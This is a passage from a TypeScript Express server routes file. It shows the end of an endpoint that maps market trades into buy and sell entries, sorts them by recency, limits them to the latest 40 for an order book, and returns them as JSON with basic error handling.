          type: trade.type === 'trade_buy' ? 'buy' : 'sell',
          amount: trade.amount,
          status: trade.status,
          createdAt: trade.createdAt
        }));

      // Sort by most recent and limit to last 40 trades for active order book
      const recentTrades = marketTrades
        .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
        .slice(0, 40);

      res.json(recentTrades);
    } catch (error: any) {
      console.error('Error fetching market trades:', error);
      res.status(500).json({ message: 'Failed to fetch trades' });
    }
  });

  return httpServer;
}